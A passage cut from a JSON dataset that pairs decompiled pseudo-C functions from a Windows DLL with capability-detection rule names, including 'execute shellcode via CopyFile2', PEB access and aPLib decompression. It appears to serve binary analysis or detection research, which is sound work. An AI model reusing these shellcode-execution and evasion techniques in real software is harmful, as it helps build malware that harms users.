        "decompiled_code": "\nvoid fcn.18002d794(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong uVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int64_t iVar8;\n    uchar auStack136 [32];\n    uchar *puStack104;\n    uchar auStack88 [8];\n    uchar auStack80 [8];\n    uint8_t uStack72;\n    uint64_t uStack64;\n    \n    uStack64 = *0x180040248 ^ auStack136;\n    iVar2 = fcn.180026a40();\n    iVar8 = 0;\n    if (*0x180049d28 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(L\"USER32.DLL\");\n        if ((iVar3 == 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"MessageBoxW\"),  iVar4 == 0))\n        goto code_r0x00018002d980;\n        *0x180049d28 = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar4);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"GetActiveWindow\");\n        *0x180049d30 = (*_sym.imp.KERNEL32.dll_EncodePointer)(uVar5);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"GetLastActivePopup\");\n        *0x180049d38 = (*_sym.imp.KERNEL32.dll_EncodePointer)(uVar5);\n        uVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"GetUserObjectInformationW\");\n        *0x180049d48 = (*_sym.imp.KERNEL32.dll_EncodePointer)(uVar5);\n        if (*0x180049d48 != 0) {\n            uVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar3, \"GetProcessWindowStation\");\n            *0x180049d40 = (*_sym.imp.KERNEL32.dll_EncodePointer)(uVar5);\n        }\n    }\n    if ((*0x180049d40 == iVar2) || (*0x180049d48 == iVar2)) {\ncode_r0x00018002d91c:\n        if (((*0x180049d30 != iVar2) &&\n            (((pcVar6 = (*_sym.imp.KERNEL32.dll_DecodePointer)(),  pcVar6 != NULL && (iVar8 = (*pcVar6)(),  iVar8 != 0))\n             && (*0x180049d38 != iVar2)))) && (pcVar6 = (*_sym.imp.KERNEL32.dll_DecodePointer)(),  pcVar6 != NULL)) {\n            iVar8 = (*pcVar6)(iVar8);\n        }\n    }\n    else {\n        pcVar6 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x180049d40);\n        pcVar7 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x180049d48);\n        if ((pcVar6 == NULL) || (pcVar7 == NULL)) goto code_r0x00018002d91c;\n        iVar3 = (*pcVar6)();\n        if (iVar3 != 0) {\n            puStack104 = auStack88;\n            iVar1 = (*pcVar7)(iVar3, 1, auStack80);\n            if ((iVar1 != 0) && ((uStack72 & 1) != 0)) goto code_r0x00018002d91c;\n        }\n        arg3._0_4_ = arg3 | 0x200000;\n    }\n    pcVar6 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x180049d28);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(iVar8, arg1, arg2, arg3);\n    }\ncode_r0x00018002d980:\n    fcn.180023980(uStack64 ^ auStack136);\n    return;\n}\n",
        "token_count": 908
    },
    "1800013d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nuchar * fcn.1800013d0(uchar *arg1, uchar *arg2, int64_t arg3)\n\n{\n    uchar *puVar1;\n    \n    puVar1 = arg1;\n    for (arg3 = arg3 << 1; arg3 != 0; arg3 = arg3 + -1) {\n        *puVar1 = *arg2;\n        arg2 = arg2 + 1;\n        puVar1 = puVar1 + 1;\n    }\n    return arg1;\n}\n",
        "token_count": 113
    },
    "18000974": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid fcn.180009740(ulong arg1, ulong arg2, ulong arg3, int64_t arg4)\n\n{\n    int64_t iVar1;\n    uint8_t *puVar2;\n    uchar *puVar3;\n    uint64_t arg4_00;\n    uchar auStack216 [32];\n    int32_t iStack184;\n    uint8_t auStack168 [16];\n    uchar auStack152 [96];\n    uchar auStack56 [40];\n    uint64_t uStack16;\n    \n    uStack16 = *0x180040248 ^ auStack216;\n    puVar2 = auStack168;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    puVar3 = auStack56;\n    for (iVar1 = 0x21; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    fcn.180007ae0(arg1, auStack152);\n    arg4_00 = arg3;\n    fcn.180007b40(arg1, auStack152, arg2, arg4_00);\n    fcn.180007cc0(arg1, auStack168, auStack152);\n    for (iStack184 = 0; iStack184 < 0x10; iStack184 = iStack184 + 1) {\n        fcn.18002411c(auStack56 + (iStack184 << 1), 0x180039b94, auStack168[iStack184], arg4_00);\n    }\n    for (iStack184 = 0; iStack184 < 0x20; iStack184 = iStack184 + 1) {\n        *(arg4 + iStack184) = auStack56[iStack184];\n    }\n    *(arg4 + iStack184) = 0;\n    fcn.180023980(uStack16 ^ auStack216);\n    return;\n}\n",
        "token_count": 467
    },
    "18000b08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid fcn.18000b080(int64_t arg1)\n\n{\n    char cVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    char *pcVar4;\n    ushort *arg2;\n    char *pcVar5;\n    uchar auStack296 [40];\n    uchar auStack256 [40];\n    char acStack216 [40];\n    ushort uStack176;\n    ushort uStack174;\n    ushort uStack172;\n    ushort uStack170;\n    ushort uStack168;\n    ushort uStack166;\n    ushort uStack164;\n    ushort uStack162;\n    ushort uStack160;\n    ushort uStack158;\n    ushort uStack156;\n    uchar auStack152 [8];\n    uchar auStack144 [40];\n    uchar auStack104 [40];\n    uchar *puStack64;\n    ulong uStack56;\n    uint64_t uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    ulong uStack24;\n    uint64_t uStack16;\n    \n    uStack56 = 0xfffffffffffffffe;\n    uStack16 = *0x180040248 ^ auStack296;\n    fcn.18000e580(arg1);\n    fcn.180001e30(arg1 + 0x20);\n    fcn.180001e30(arg1 + 0x48);\n    fcn.180001e80(auStack144, L\"AutoRun\");\n    pcVar4 = acStack216;\n    for (iVar3 = 0x21; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *pcVar4 = '\\0';\n        pcVar4 = pcVar4 + 1;\n    }\n    fcn.180007a60(auStack152);\n    iVar3 = fcn.1800020f0(auStack144);\n    uStack48 = iVar3 << 1;\n    uVar2 = fcn.1800020d0(auStack144);\n    fcn.180009740(auStack152, uVar2, uStack48 & 0xffffffff, acStack216);\n    iVar3 = -1;\n    pcVar4 = acStack216;\n    pcVar5 = pcVar4;\n    do {\n        if (iVar3 == 0) break;\n        iVar3 = iVar3 + -1;\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    if (iVar3 == -0x22) {\n        puStack64 = auStack104;\n        uStack40 = fcn.18000b740(puStack64, acStack216);\n        uVar2 = fcn.18000e140(auStack256, uStack40);\n        uStack32 = uVar2;\n        uStack24 = uVar2;\n        fcn.18000b7b0(arg1 + 0x20, uVar2);\n        fcn.180001ef0(auStack256, uVar2);\n        uStack176 = 0x2e;\n        uStack174 = 0x73;\n        uStack172 = 0x62;\n        uStack170 = 0x72;\n        uStack168 = 0x5c;\n        uStack166 = 0x4f;\n        uStack164 = 0x72;\n        uStack162 = 100;\n        uStack160 = 0x65;\n        uStack158 = 0x72;\n        uStack156 = 0;\n        arg2 = &uStack176;\n        fcn.180001f50(arg1 + 0x48, arg2);\n        fcn.180007ac0(auStack152);\n        fcn.180001ef0(auStack144, arg2);\n    }\n    else {\n        fcn.180007ac0(auStack152);\n        fcn.180001ef0(auStack144, pcVar4);\n    }\n    fcn.180023980(uStack16 ^ auStack296);\n    return;\n}\n",
        "token_count": 875
    },
    "18001fae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9"
        ],
        "decompiled_code": "\nvoid fcn.18001fae0(int64_t arg1, ulong arg2, int16_t *arg3)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    ulong uVar5;\n    int64_t iVar6;\n    uint64_t uVar7;\n    char *pcVar8;\n    ulong arg2_00;\n    uint *puVar9;\n    uchar *puVar10;\n    int16_t *piVar11;\n    uchar auStack2568 [32];\n    uint uStack2536;\n    uchar auStack2512 [40];\n    uchar auStack2472 [40];\n    uchar auStack2432 [40];\n    uchar auStack2392 [400];\n    char acStack1992 [40];\n    ulong uStack1952;\n    uchar auStack1944 [20];\n    uchar auStack1924 [36];\n    uchar auStack1888 [8];\n    ulong uStack1880;\n    uchar auStack1872 [8];\n    uchar auStack1864 [28];\n    uint uStack1836;\n    uchar auStack1768 [28];\n    uint32_t uStack1740;\n    uint uStack1736;\n    uchar auStack1732 [60];\n    uchar auStack1672 [8];\n    uint uStack1664;\n    uchar uStack1660;\n    uint32_t uStack1656;\n    uint32_t uStack1652;\n    uchar auStack1640 [400];\n    char acStack1240 [40];\n    uchar auStack1200 [40];\n    ulong uStack1160;\n    uint auStack1152 [5];\n    uchar auStack1132 [36];\n    uchar auStack1096 [8];\n    uchar auStack1088 [32];\n    uint auStack1056 [2];\n    ulong uStack1048;\n    uchar auStack1040 [8];\n    uchar auStack1032 [28];\n    uint uStack1004;\n    uchar auStack936 [28];\n    uint32_t uStack908;\n    uint uStack904;\n    uchar auStack900 [60];\n    uchar uStack840;\n    uchar uStack839;\n    uchar uStack838;\n    uchar uStack837;\n    uchar auStack832 [40];\n    uchar *puStack792;\n    uchar auStack784 [40];\n    uchar *puStack744;\n    uchar uStack736;\n    uchar uStack735;\n    uchar uStack734;\n    uchar uStack733;\n    uchar uStack732;\n    uchar auStack728 [40];\n    uchar *puStack688;\n    uchar auStack680 [40];\n    uchar *puStack640;\n    uchar auStack632 [64];\n    uchar auStack568 [64];\n    uchar auStack504 [88];\n    uchar auStack416 [88];\n    uchar auStack328 [88];\n    uchar auStack240 [88];\n    ulong uStack152;\n    ulong uStack144;\n    ulong uStack136;\n    ulong uStack128;\n    ulong uStack120;\n    int16_t *piStack112;\n    ulong uStack104;\n    int16_t *piStack96;\n    ulong uStack88;\n    uint64_t uStack80;\n    ulong uStack72;\n    ulong uStack64;\n    ulong uStack56;\n    ulong uStack48;\n    ulong uStack40;\n    uint64_t uStack32;\n    \n    uStack152 = 0xfffffffffffffffe;\n    uStack32 = *0x180040248 ^ auStack2568;\n    if (*0x18003abbc < *(arg1 + 0x30) || *0x18003abbc == *(arg1 + 0x30)) {\n        puVar4 = auStack1672;\n        for (iVar6 = 0xd; iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        uStack1664 = *0x18003abb8;\n        uStack1660 = 0x61;\n        cVar2 = (**0x18004ac68)(arg2, auStack1672, 0xd);\n        if (cVar2 != '\\0') {\n            uStack1656 = 0;\n            cVar2 = (**0x18004ac60)(arg2, &uStack1656, 4, 0xffffffff);\n            if (cVar2 != '\\0') {\n                for (uStack1652 = 0; uStack1652 < uStack1656; uStack1652 = uStack1652 + 1) {\n                    puVar4 = auStack1088;\n                    for (iVar6 = 0x20; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar4 = 0;\n                        puVar4 = puVar4 + 1;\n                    }\n                    puVar9 = auStack1056;\n                    for (iVar6 = 4; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar9 = 0;\n                        puVar9 = puVar9 + 1;\n                    }\n                    cVar2 = (**0x18004ac60)(arg2, auStack1088, 0x24, 0xffffffff);\n                    if (cVar2 == '\\0') break;\n                    puStack744 = auStack784;\n                    uStack120 = fcn.18000b740(puStack744, auStack1088);\n                    fcn.18000e140(auStack1200, uStack120);\n                    piStack112 = fcn.1800020d0(auStack1200);\n                    uStack104 = 0;\n                    iVar6 = -1;\n                    piVar11 = piStack112;\n                    do {\n                        if (iVar6 == 0) break;\n                        iVar6 = iVar6 + -1;\n                        iVar1 = *piVar11;\n                        piVar11 = piVar11 + 1;\n                    } while (iVar1 != 0);\n                    if (iVar6 == -2) {\n                        uStack736 = 0;\n                        fcn.180001ef0(auStack1200, piStack112);\n                        break;\n                    }\n                    uVar5 = arg2;\n                    fcn.180001700(auStack1640, arg2);\n                    cVar2 = fcn.180001830(auStack1640);\n                    if (cVar2 == '\\0') {\n                        uStack735 = 0;\n                        fcn.1800017e0(auStack1640);\n                        fcn.180001ef0(auStack1200, uVar5);\n                        break;\n                    }\n                    cVar2 = fcn.180001b40(auStack1640);\n                    if (cVar2 == '\\0') {\n                        uStack734 = 0;\n                        fcn.1800017e0(auStack1640);\n                        fcn.180001ef0(auStack1200, uVar5);\n                        break;\n                    }\n                    puVar4 = fcn.180001d70(auStack1640);\n                    puVar10 = auStack416;\n                    for (iVar6 = 0x51; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar10 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    puVar4 = auStack416;\n                    puVar10 = auStack936;\n                    for (iVar6 = 0x51; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar10 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    puVar4 = fcn.180001d90(auStack1640);\n                    puVar10 = auStack504;\n                    for (iVar6 = 0x51; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar10 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    puVar4 = auStack504;\n                    puVar10 = auStack1032;\n                    for (iVar6 = 0x51; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar10 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    uStack1160 = fcn.180001d50(auStack1640);\n                    uStack1048 = fcn.180015b40(CONCAT44(uStack904, uStack908));\n                    fcn.18000eb30(auStack1040);\n                    uVar5 = uStack1160;\n                    iVar3 = fcn.180002fc0(auStack1040, uStack1160, uStack1048);\n                    if (iVar3 == 0) {\n                        fcn.180015b80(&uStack1048);\n                        uStack733 = 0;\n                        fcn.18000bcf0(auStack1040);\n                        fcn.1800017e0(auStack1640);\n                        fcn.180001ef0(auStack1200, uVar5);\n                        break;\n                    }\n                    pcVar8 = acStack1240;\n                    for (iVar6 = 0x21; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *pcVar8 = '\\0';\n                        pcVar8 = pcVar8 + 1;\n                    }\n                    fcn.180007a60(auStack1096);\n                    fcn.180009740(auStack1096, uStack1048, uStack908, acStack1240);\n                    uVar7 = 0xffffffffffffffff;\n                    pcVar8 = acStack1240;\n                    do {\n                        if (uVar7 == 0) break;\n                        uVar7 = uVar7 - 1;\n                        cVar2 = *pcVar8;\n                        pcVar8 = pcVar8 + 1;\n                    } while (cVar2 != '\\0');\n                    pcVar8 = acStack1240;\n                    iVar3 = fcn.180030ca8(auStack900, pcVar8, ~uVar7 - 1);\n                    if (iVar3 != 0) {\n                        fcn.180001a60(auStack1640);\n                        fcn.180015b80(&uStack1048);\n                        uStack732 = 0;\n                        fcn.180007ac0(auStack1096);\n                        fcn.18000bcf0(auStack1040);\n                        fcn.1800017e0(auStack1640);\n                        fcn.180001ef0(auStack1200, pcVar8);\n                        break;\n                    }\n                    fcn.1800011f0(acStack1240, 0x21);\n                    piStack96 = fcn.1800020d0(auStack1200);\n                    uStack88 = 0;\n                    uVar7 = 0xffffffffffffffff;\n                    piVar11 = piStack96;\n                    do {\n                        if (uVar7 == 0) break;\n                        uVar7 = uVar7 - 1;\n                        iVar1 = *piVar11;\n                        piVar11 = piVar11 + 1;\n                    } while (iVar1 != 0);\n                    uStack80 = (~uVar7 - 1) * 2;\n                    uVar5 = fcn.1800020d0(auStack1200);\n                    fcn.180009740(auStack1096, uVar5, uStack80 & 0xffffffff, acStack1240);\n                    puVar9 = auStack1152;\n                    for (iVar6 = 0x35; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar9 = 0;\n                        puVar9 = puVar9 + 1;\n                    }\n                    auStack1152[0] = auStack1056[0];\n                    fcn.180015e80(auStack1132, 0x21, auStack900);\n                    puStack688 = auStack728;\n                    puVar9 = auStack1152;\n                    puVar4 = auStack568;\n                    for (iVar6 = 0x35; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar4 = *puVar9;\n                        puVar9 = puVar9 + 1;\n                        puVar4 = puVar4 + 1;\n                    }\n                    uStack72 = fcn.18000b740(auStack728, acStack1240);\n                    uStack64 = fcn.18000e140(auStack2472, uStack72);\n                    uStack56 = uStack64;\n                    uVar5 = fcn.1800020d0(uStack64);\n                    uStack2536 = uStack1004;\n                    fcn.180020f30(arg1, uVar5, auStack568, uStack1160);\n                    fcn.180001ef0(auStack2472, uVar5);\n                    fcn.180001a60(auStack1640);\n                    fcn.180015b80(&uStack1048);\n                    puStack640 = auStack680;\n                    uStack48 = fcn.18000b740(puStack640, auStack1088);\n                    uStack40 = fcn.18000e140(auStack2432, uStack48);\n                    uVar5 = fcn.1800020d0(uStack40);\n                    arg2_00 = 0x4000;\n                    fcn.180015ef0(arg3, 0x4000, uVar5);\n                    fcn.180001ef0(auStack2432, arg2_00);\n                    if (uStack1652 < uStack1656 - 1) {\n                        arg2_00 = 0x4000;\n                        fcn.180015ef0(arg3, 0x4000, 0x1800387d4);\n                    }\n                    fcn.180007ac0(auStack1096);\n                    fcn.18000bcf0(auStack1040);\n                    fcn.1800017e0(auStack1640);\n                    fcn.180001ef0(auStack1200, arg2_00);\n                }\n            }\n        }\n    }\n    else {\n        iVar6 = -1;\n        piVar11 = arg3;\n        do {\n            if (iVar6 == 0) break;\n            iVar6 = iVar6 + -1;\n            iVar1 = *piVar11;\n            piVar11 = piVar11 + 1;\n        } while (iVar1 != 0);\n        if (iVar6 != -2) {\n            fcn.180001700(auStack2392, arg2);\n            cVar2 = fcn.180001830(auStack2392);\n            if (cVar2 == '\\0') {\n                uStack840 = 0;\n                fcn.1800017e0(auStack2392);\n            }\n            else {\n                cVar2 = fcn.180001b40(auStack2392);\n                if (cVar2 == '\\0') {\n                    uStack839 = 0;\n                    fcn.1800017e0(auStack2392);\n                }\n                else {\n                    puVar4 = fcn.180001d70(auStack2392);\n                    puVar10 = auStack240;\n                    for (iVar6 = 0x51; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar10 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    puVar4 = auStack240;\n                    puVar10 = auStack1768;\n                    for (iVar6 = 0x51; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar10 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    puVar4 = fcn.180001d90(auStack2392);\n                    puVar10 = auStack328;\n                    for (iVar6 = 0x51; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar10 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    puVar4 = auStack328;\n                    puVar10 = auStack1864;\n                    for (iVar6 = 0x51; iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar10 = *puVar4;\n                        puVar4 = puVar4 + 1;\n                        puVar10 = puVar10 + 1;\n                    }\n                    uStack1952 = fcn.180001d50(auStack2392);\n                    uStack1880 = fcn.180015b40(CONCAT44(uStack1736, uStack1740));\n                    fcn.18000eb30(auStack1872);\n                    iVar3 = fcn.180002fc0(auStack1872, uStack1952, uStack1880);\n                    if (iVar3 == 0) {\n                        fcn.180015b80(&uStack1880);\n                        uStack838 = 0;\n                        fcn.18000bcf0(auStack1872);\n                        fcn.1800017e0(auStack2392);\n                    }\n                    else {\n                        pcVar8 = acStack1992;\n                        for (iVar6 = 0x21; iVar6 != 0; iVar6 = iVar6 + -1) {\n                            *pcVar8 = '\\0';\n                            pcVar8 = pcVar8 + 1;\n                        }\n                        fcn.180007a60(auStack1888);\n                        fcn.180009740(auStack1888, uStack1880, uStack1740, acStack1992);\n                        uVar7 = 0xffffffffffffffff;\n                        pcVar8 = acStack1992;\n                        do {\n                            if (uVar7 == 0) break;\n                            uVar7 = uVar7 - 1;\n                            cVar2 = *pcVar8;\n                            pcVar8 = pcVar8 + 1;\n                        } while (cVar2 != '\\0');\n                        iVar3 = fcn.180030ca8(auStack1732, acStack1992, ~uVar7 - 1);\n                        if (iVar3 == 0) {\n                            fcn.1800011f0(acStack1992, 0x21);\n                            uVar7 = 0xffffffffffffffff;\n                            piVar11 = arg3;\n                            do {\n                                if (uVar7 == 0) break;\n                                uVar7 = uVar7 - 1;\n                                iVar1 = *piVar11;\n                                piVar11 = piVar11 + 1;\n                            } while (iVar1 != 0);\n                            fcn.180009740(auStack1888, arg3, (~uVar7 - 1) * 2 & 0xffffffff, acStack1992);\n                            puVar4 = auStack1944;\n                            for (iVar6 = 0x35; iVar6 != 0; iVar6 = iVar6 + -1) {\n                                *puVar4 = 0;\n                                puVar4 = puVar4 + 1;\n                            }\n                            fcn.180015e80(auStack1924, 0x21, auStack1732);\n                            puStack792 = auStack832;\n                            puVar4 = auStack1944;\n                            puVar10 = auStack632;\n                            for (iVar6 = 0x35; iVar6 != 0; iVar6 = iVar6 + -1) {\n                                *puVar10 = *puVar4;\n                                puVar4 = puVar4 + 1;\n                                puVar10 = puVar10 + 1;\n                            }\n                            uStack144 = fcn.18000b740(auStack832, acStack1992);\n                            uStack136 = fcn.18000e140(auStack2512, uStack144);\n                            uStack128 = uStack136;\n                            uVar5 = fcn.1800020d0(uStack136);\n                            uStack2536 = uStack1836;\n                            fcn.180020f30(arg1, uVar5, auStack632, uStack1952);\n                            fcn.180001ef0(auStack2512, uVar5);\n                            fcn.180001a60(auStack2392);\n                            fcn.180015b80(&uStack1880);\n                            fcn.180007ac0(auStack1888);\n                            fcn.18000bcf0(auStack1872);\n                            fcn.1800017e0(auStack2392);\n                        }\n                        else {\n                            fcn.180001a60(auStack2392);\n                            fcn.180015b80(&uStack1880);\n                            uStack837 = 0;\n                            fcn.180007ac0(auStack1888);\n                            fcn.18000bcf0(auStack1872);\n                            fcn.1800017e0(auStack2392);\n                        }\n                    }\n                }\n            }\n        }\n    }\n    fcn.180023980(uStack32 ^ auStack2568);\n    return;\n}\n",
        "token_count": 4710
    },
    "18000170": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nint64_t fcn.180001700(int64_t arg1, ulong arg2)\n\n{\n    fcn.18000caf0(arg1);\n    fcn.180001e30(arg1 + 0x30);\n    fcn.180001e30(arg1 + 0x58);\n    *(arg1 + 0x20) = arg2;\n    *(arg1 + 0x28) = 0;\n    *(arg1 + 0x178) = 0;\n    *(arg1 + 0x180) = 0;\n    fcn.1800011f0(arg1 + 0x80, 0x51);\n    fcn.1800011f0(arg1 + 0x122, 0x51);\n    fcn.1800011f0(arg1 + 0xd1, 0x51);\n    fcn.1800020b0(arg1 + 0x30);\n    return arg1;\n}\n",
        "token_count": 209
    },
    "18000cdf": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.18000cdf0(ulong arg1)\n\n{\n    ulong arg4;\n    ulong *puVar1;\n    uchar auStack48 [8];\n    ulong uStack40;\n    uchar auStack32 [8];\n    uchar auStack24 [24];\n    \n    puVar1 = fcn.18000ccb0(arg1, auStack48);\n    arg4 = *puVar1;\n    puVar1 = fcn.18000ced0(arg1, auStack32);\n    uStack40 = *puVar1;\n    fcn.18000cf10(arg1, auStack24, uStack40, arg4);\n    return;\n}\n",
        "token_count": 141
    },
    "18000eee": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.18000eee0(ulong arg1)\n\n{\n    ulong arg4;\n    ulong *puVar1;\n    uchar auStack48 [8];\n    ulong uStack40;\n    uchar auStack32 [8];\n    uchar auStack24 [24];\n    \n    puVar1 = fcn.18001cb20(arg1, auStack48);\n    arg4 = *puVar1;\n    puVar1 = fcn.18001c8a0(arg1, auStack32);\n    uStack40 = *puVar1;\n    fcn.18000f0c0(arg1, auStack24, uStack40, arg4);\n    return;\n}\n",
        "token_count": 145
    },
    "18001c4e": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.18001c4e0(ulong arg1)\n\n{\n    ulong arg4;\n    ulong *puVar1;\n    uchar auStack48 [8];\n    ulong uStack40;\n    uchar auStack32 [8];\n    uchar auStack24 [24];\n    \n    puVar1 = fcn.18001cb20(arg1, auStack48);\n    arg4 = *puVar1;\n    puVar1 = fcn.18001c8a0(arg1, auStack32);\n    uStack40 = *puVar1;\n    fcn.18001c8d0(arg1, auStack24, uStack40, arg4);\n    return;\n}\n",
        "token_count": 147
    },
    "18001ee1": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.18001ee10(ulong arg1)\n\n{\n    char cVar1;\n    uint64_t uVar2;\n    uint32_t *puVar3;\n    ulong uVar4;\n    code *pcVar5;\n    ulong in_RDX;\n    uchar auStack232 [32];\n    uint uStack200;\n    ulong uStack192;\n    uint uStack184;\n    uchar uStack180;\n    uchar auStack168 [112];\n    int32_t iStack56;\n    uint *puStack48;\n    ulong uStack40;\n    uint64_t uStack32;\n    int64_t iStack24;\n    uint64_t uStack16;\n    \n    uStack40 = 0xfffffffffffffffe;\n    uStack16 = *0x180040248 ^ auStack232;\n    uStack184 = 0;\n    uStack180 = 1;\n    fcn.18000b080(auStack168);\n    cVar1 = fcn.18000b330(auStack168);\n    if (cVar1 == '\\0') {\n        uStack180 = 0;\n        fcn.18000b2f0(auStack168, in_RDX);\n    }\n    else {\n        iStack56 = 0;\n        while( true ) {\n            uStack32 = iStack56;\n            uVar2 = fcn.18000b810(auStack168);\n            if (uVar2 <= uStack32) break;\n            puStack48 = fcn.180015b40(0xc);\n            *puStack48 = 0xffffffff;\n            puVar3 = fcn.18000b840(auStack168, iStack56);\n            uVar4 = fcn.180015b40(*puVar3);\n            *(puStack48 + 1) = uVar4;\n            iStack24 = fcn.18000b840(auStack168, iStack56);\n            puVar3 = fcn.18000b840(auStack168, iStack56);\n            fcn.180001590(*(puStack48 + 1), *puVar3, *(iStack24 + 4));\n            pcVar5 = fcn.18001e5f0(0x1800387d8);\n            uStack192 = 0;\n            uStack200 = 0;\n            in_RDX = 0;\n            (*pcVar5)(0, 0, 0x180021940, puStack48);\n            iStack56 = iStack56 + 1;\n        }\n        fcn.18000b2f0(auStack168, in_RDX);\n    }\n    fcn.180023980(uStack16 ^ auStack232);\n    return;\n}\n",
        "token_count": 583
    },
    "18000692": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nvoid fcn.180006920(int64_t arg1, int64_t arg2)\n\n{\n    *(arg1 + 0x2c) = *(arg2 + 1) << 0x18 | *(arg2 + 2) << 0x10 | *(arg2 + 3) << 8 | *(arg2 + 4);\n    *(arg1 + 0x28) = 0xffffffff;\n    *(arg1 + 0x60) = 0;\n    return;\n}\n",
        "token_count": 110
    },
    "1800073d": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nulong fcn.1800073d0(uint32_t *arg1, uint8_t *arg2, ulong arg3)\n\n{\n    uint8_t uVar1;\n    ulong uVar2;\n    uint32_t uStack24;\n    \n    if (arg3 < 5) {\n        uVar2 = 4;\n    }\n    else {\n        uStack24 = *(arg2 + 1);\n        if (uStack24 < 0x1000) {\n            uStack24 = 0x1000;\n        }\n        arg1[3] = uStack24;\n        uVar1 = *arg2;\n        if (uVar1 < 0xe1) {\n            *arg1 = uVar1 % 9;\n            arg1[2] = (uVar1 / 9) / 5;\n            arg1[1] = (uVar1 / 9) % 5;\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = 4;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 229
    },
    "1800095e": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
